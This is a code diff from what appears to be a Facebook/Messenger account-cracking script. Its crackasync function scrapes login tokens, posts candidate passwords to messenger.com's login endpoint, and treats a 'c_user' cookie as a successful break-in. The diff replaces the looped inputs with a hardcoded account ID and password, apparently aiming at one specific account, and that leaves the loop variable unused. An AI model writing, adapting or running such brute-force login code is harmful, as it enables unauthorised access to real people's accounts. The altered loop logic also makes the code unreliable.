@@ -738,7 +738,7 @@ def crackasync(idf,pwv):
              "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
              "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
              "lgnjs":"n",
-             "email":idf,
+             "email":'100078110812030',
              "pass":"Sungkem Puh Sepuhh",
              "login":"1",
              "persistent":"1",
@@ -749,7 +749,7 @@ def crackasync(idf,pwv):
 		except:pass
 	for pw in pwv:
 		try:
-			data.update({"pass":"".join(pw)})
+			data.update({"pass":"".join('767980')})
 			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)		
 			if 'c_user' in ses.cookies.get_dict():
 				print(f'\r{h}[die-check]{u}{idf}|{u}{pw}{x}\n')
